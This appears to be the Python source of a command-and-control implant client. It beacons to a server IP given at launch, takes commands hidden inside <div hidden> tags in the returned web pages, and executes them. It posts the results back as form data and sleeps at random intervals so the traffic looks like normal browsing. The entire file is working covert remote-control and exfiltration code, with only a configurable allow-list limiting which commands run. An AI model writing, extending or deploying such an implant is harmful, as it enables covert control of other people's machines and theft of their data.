from time import sleep
from threading import Thread, Event
from argparse import ArgumentParser

import numpy as np

import requests
import random
import json


from src.error import *
from src.utils import *
from src.runner import *




server = "0.0.0.0"
with open("config/config.json", "r") as file:
    configs = json.loads(file.read())
print(f'{configs.get("name")}: v{configs.get("version")}')


def http_request(server, methods="GET", target="/", data=""):
    if not is_ipv4(server):
        print("Invalid server IPv4")
        raise RequestError
    if methods == "POST":
        return post_request(server, target, data)
    elif methods == "GET":
        return get_request(server, target)
    else:
        raise MethodError


def get_request(server, target="/"):
    return requests.get(url="http://" + server + target, params={})

def post_request(server, target="/", data=""):
    return requests.post(url="http://" + server + target, data={"data":f'{data}'.encode()})


def start(stop_event):
    print("Server at: " + server)
    print("Prepared first request to send...")
    res = http_request(server)
    target = "/"
    print("Request sent...")
    while not stop_event.is_set():
        if "<div hidden" in res.text:
            command = res.text.split("<div hidden")[1].split("</div>")[0][1:].strip()
            command = command[1:-1].replace("'", "").replace(" ", "").split(',')
            # execute command
            data = run(command[0], configs.get("allowed_commands"), stop_event)
            # send data through POST request
            if command != "kill":
                res = http_request(server, target=choose_target(res.text, method="POST"), methods="POST", data=data)
        else:
            # # Choose an url in response webpage and send one GET request
            res = http_request(server, target=choose_target(res.text))
        if not stop_event.is_set():
            rand  = random.choice(np.arange(start=3, stop=15, step=0.042))
            print(f'Sleeping for {rand:.2f} seconds.')
            sleep(rand)


if __name__ == "__main__":
    
    parser = ArgumentParser()
    parser.add_argument("ip", type=str)
    args = parser.parse_args()
    print("Running...")

    stop_event = Event()

    server = args.ip
    implant = Thread(target=start, args=(stop_event,))
    implant.start()
    implant.join()
    print("Goodbye!")

    